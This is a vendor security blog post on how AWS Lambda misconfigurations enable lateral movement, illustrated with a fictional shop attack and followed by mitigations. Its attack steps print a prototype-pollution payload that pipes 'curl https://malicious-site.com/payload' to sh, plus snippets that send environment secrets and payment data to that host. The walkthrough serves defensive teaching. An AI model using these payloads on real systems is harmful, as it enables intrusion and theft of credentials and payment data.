---
title: "Securing AWS Lambda | How Misconfigurations Can Lead to Lateral Movement"
date: 2025-01-08
tags: 
  - "attack"
  - "author"
  - "ict"
  - "malicious"
  - "secure"
---

Learn how several misconfigurations and user-defined code issues in AWS Lambda could lead to potential credential theft and lateral movement.

As serverless computing continues to revolutionize the cloud landscape, AWS Lambda has emerged as a pivotal service, offering a Function-as-a-Service (FaaS) model that allows developers to focus solely on code while AWS manages the underlying infrastructure. This shift towards serverless architectures brings new security challenges and considerations that security researchers and professionals must understand and address.

AWS Lambda is, at its core, built on an event-driven architecture. Functions are triggered by specific events or state changes within the AWS ecosystem or from external sources. This model introduces unique security implications, as each event source and function becomes a potential attack vector.

While many believe the stateless and ephemeral nature of Lambda ensures safety, there have been numerous real world incidents and attacks involving serverless functions. Examples include malware that specifically targets AWS Lambda (originally found by Cado Labs), and attacks where data exfiltration from AWS Lambda was one of the attacker’s goals like the one perpetrated by the Scarlet Eel adversary originally found by Sysdig. Most commonly, however, AWS Lambda is targeted for its potential to enable credential theft and lateral movement which leads to a larger scope of attack.

This blog post aims to provide an understanding of how several misconfigurations and user-defined code issues in AWS Lambda can lead to these specific security issues for your organization.

**An important note:** In this Attack&Defend blog series, we explore _potential_ issues and issues seen in the wild. We are not stating in this article there is a security vulnerability with AWS Lambda as a service; we are exploring what could potentially happen when security best practices such as least privileges, misconfigurations, and service-specific security best practices are not followed.

![](https://www.sentinelone.com/wp-content/uploads/2024/11/Securing-AWS-Lambda-How-Misconfigurations-Can-Lead-to-Lateral-Movement1.jpg)

## A Quick Introduction to AWS Lambda

While AWS Lambda and serverless architectures are becoming more prevalent and offer numerous benefits including automatic scaling, reduced operational overhead, and cost optimization, they also introduce new security considerations.

The AWS Shared Responsibility Model, as it relates to Lambda deployments, means that while AWS secures the underlying infrastructure, developers and security professionals are responsible for securing the function code, managing access controls, and ensuring the integrity of the data processed by these functions.

Key components of the AWS Lambda architecture include:

- Event Sources – These triggers, such as API Gateway requests, S3 bucket changes, or DynamoDB updates, can be exploited if not properly secured.
- Lambda Functions – The core of the serverless application, where code execution takes place and vulnerabilities may be introduced.
- Execution Environment – Managed by AWS but configurable by users, presenting potential misconfigurations that could be exploited.
- Event Consumers – Often other AWS services or external APIs that interact with Lambda functions, expanding the attack surface.

## A Real-World Example of an AWS Lambda Attack

To demonstrate a flow of lateral movement using AWS Lambda, we will look at the following application architecture. This is a simple front-to-back application with gateway Lambda and internal Lambda functions that access the internal DBs and information.

![](https://www.sentinelone.com/wp-content/uploads/2024/11/lateralmovement_lambda.jpg)

Let’s consider a fictional e-commerce company, “SentiShop,” that uses a serverless architecture on AWS. They have several Lambda functions handling different aspects of their platform:

- `process-order`: Handles new orders
- `payment-gateway`: Processes payments

### The Misconfiguration

SentiShop has made several critical misconfigurations:

- The `process-order` function has an overly permissive IAM role, allowing it to invoke any Lambda function and access various AWS services.
- Input validation is insufficient in the `process-order` function.
- `process-order` is using a vulnerable json parser.
- Sensitive data, including a database connection string, is stored in environment variables.
- All functions are in the same AWS account without proper segmentation.

### The Attack

Here’s how an attacker, exploits these misconfigurations to perform a lateral movement attack:

![](https://www.sentinelone.com/wp-content/uploads/2024/11/exploitpath_lambda.jpg)

### Step 1: Initial Access via Dependency Exploitation

An attacker discovers that the `process-order` function uses an outdated version of a popular npm package for JSON parsing, which has a known prototype pollution vulnerability. They craft a malicious order payload:

```
{ 
"order_id": "1337", 
"__proto__": { 
"polluted": "true" 
}, 
"items": [{"id": 1, "quantity": 1}]
}

```

The process-order function uses the outdated package to parse the incoming JSON:

```
const vulnerableJsonParser = require('vulnerable-json-parser'); 
exports.handler = async (event) => { 
const order = vulnerableJsonParser.parse(event.body); 
// Process the order…
}
```

This prototype pollution vulnerability allows the attacker to modify the behavior of the function and potentially execute arbitrary code.

### Step 2: Achieving Code Execution

The attacker then exploits the prototype pollution to override the `toString` method of Object, which is often implicitly called in Node.js applications:

```
{
"order_id": "1337", 
"__proto__": { 
"toString": "function(){return require('child_process').execSync('curl https://malicious-site.com/payload | sh')}", 
"polluted": "true" 
}, 
"items": [{"id": 1, "quantity": 1}]
}

```

When the function tries to use `toString` on any object, it will instead execute the attacker’s malicious code, which downloads and runs a payload from their command-and-control (C2) server.

### Step 3: Exploiting Environment Variables

Now that the attacker has code execution, they can access the function’s environment variables:

```
function malicious_function() {
secrets = process.env 
# Send secrets to attacker-controlled server 
requests.post('https://malicious-site.com/payload', {“env”: secrets})
}

```

They now have the database connection string and AWS credentials associated with the function’s IAM role.

### Step 4: Lateral Movement

Using our overly permissive IAM role, the attacker can look for available Lambda functions across the environment:

```
const AWS = require('aws-sdk');
async function listAvailableLambdaFunctions() {
// Initialize the Lambda client
const lambda = new AWS.Lambda();
const functions = [];
let nextMarker = null;

try {
do {
// List Lambda functions, 50 at a time (default limit)
const response = await lambda.listFunctions({
Marker: nextMarker
}).promise();

// Add the functions to our list
functions.push(...response.Functions);

// Check if there are more functions to fetch
nextMarker = response.NextMarker;
} while (nextMarker);

// Log and return the list of functions
console.log('Available Lambda functions:');
functions.forEach(func => {
console.log(`- ${func.FunctionName} (Runtime: ${func.Runtime}, Last Modified: ${func.LastModified})`);
});

return functions;
} catch (error) {
console.error('Error listing Lambda functions:', error);
throw error;
}

}
```

Running this the attacker will find that there is a payment-gateway Lambda. The next step will be to try to understand any exploitation potential.

### Step 5: Data Exfiltration

With the overly permissive IAM role, the attacker can now invoke another Lambda functions, specifically the payment-gateway function in-order to get payment information from the application database:

```
const AWS = require('aws-sdk');
const https = require('https');

async function lateralMovement() {
const lambda = new AWS.Lambda();

try {
// Invoke the payment-gateway function
const response = await lambda.invoke({
FunctionName: 'payment-gateway',
InvocationType: 'RequestResponse',
Payload: JSON.stringify({ action: "list_transactions" })
}).promise();

// Extract sensitive payment data
const paymentData = JSON.parse(response.Payload);
 
// Exfiltrate sensitive payment data
await new Promise((resolve, reject) => {
const req = https.request({
hostname: 'malicious-site.com',
port: 443,
path: '/payload',
method: 'POST',
headers: {
'Content-Type': 'application/json'

}
}, (res) => {
res.on('data', () => {});
res.on('end', resolve);
});
 
req.on('error', reject);
req.write(JSON.stringify(paymentData));
req.end();
});
 
console.log('Data exfiltrated successfully');
} catch (error) {
console.error('Error during lateral movement:', error);
}

}
```

They can repeat this process for other functions, gradually expanding their access across the entire serverless architecture.

## Mitigating Lateral Movement Attacks in AWS Lambda

To prevent lateral movement attacks in AWS Lambda environments as demonstrated in the real-world example above, organizations should implement multiple layers of security controls. Here are key mitigation strategies:

### IAM Role Hardening

- Implement the principle of least privilege for Lambda function IAM roles. Use separate roles for different functions rather than shared roles.
- Use AWS Service Control Policies (SCPs) to enforce guardrails.
- Implement role assumption restrictions using `aws:SourceIp` and `aws:PrincipalTag` conditions.

### Lambda Function Protection

- Implement input validation and sanitization at the Lambda application level.
- Enable Lambda function URL authorization or API Gateway authentication.
- API Gateway request validators can be used with json scheme to prevent the proto pollution attack.
- Package management should be used to prevent usage of insecure dependencies.
- Store secrets in a secret manager.

### Monitoring and Detection

- Enable AWS CloudTrail for API activity monitoring.
- Configure CloudWatch Logs for Lambda function logging. Set up CloudWatch Alarms for suspicious activities.
- Enable VPC Flow Logs for network monitoring.
- Cloud Native Application Protection Platforms, like SentinelOne’s Cloud Native Security, detect misconfigurations and vulnerabilities and provide insight into the exploitability of cloud issues to help security and cloud teams prioritize and remediate cloud issues to reduce organizations’ cloud risk.

<figure>

![](https://www.sentinelone.com/wp-content/uploads/2024/11/CNS_misconfig_findings.jpg)

<figcaption>

SentinelOne’s Cloud Native Security showing example misconfiguration findings related to AWS Lambda

</figcaption>

</figure>

<figure>

![](https://www.sentinelone.com/wp-content/uploads/2024/11/CNS_alert_details.jpg)

<figcaption>

Cloud Native Security detailing a “Sensitive Credentials Permissions Assigned to AWS Lambda Function via IAM Policy” alert

</figcaption>

</figure>

<figure>

![](https://www.sentinelone.com/wp-content/uploads/2024/11/CNS_graph_view.jpg)

<figcaption>

Cloud Native Security’s graphical view of the Lambda function and associated IAM Role and IAM Policy that is misconfigured

</figcaption>

</figure>

### Isolating Logics

Best practice is to ensure true separate zones between front-end and back-end. Developers and cloud architects should:

- Configure VPC settings appropriately for Lambda functions that need internal resource access.
- Implement security groups and network ACLs.
- Use AWS PrivateLink for service-to-service communication.
- Implement proper tagging strategies for resource management.

Generally, our advice is to build per AWS’ Well Architected Framework for serverless applications. The framework details architectural best practices for designing and operating reliable, secure, and cost-effective systems. Well-architected systems help organizations identify areas for improvement and greatly decrease risks within the cloud.

## Conclusion

This scenario demonstrates how a series of misconfigurations could lead to a severe security breach in a serverless environment. By exploiting a single vulnerable function, an attacker can potentially gain access to an entire serverless application ecosystem.

Security in serverless environments is a shared responsibility, and while cloud providers secure the underlying infrastructure, it’s crucial for developers and operations teams to ensure they secure their functions, data, and access policies.

By implementing the mitigation strategies outlined above, organizations can significantly reduce the risk of lateral movement attacks and other serverless security threats. Stay vigilant, keep your serverless applications updated, and continuously monitor for any signs of suspicious activity.

Singularity![™](https://s.w.org/images/core/emoji/15.0.3/72x72/2122.png) Cloud Native Security

Eliminate false positives and take fast action on alerts that matter with an agentless CNAPP solution.

Request a Demo

Go to Source
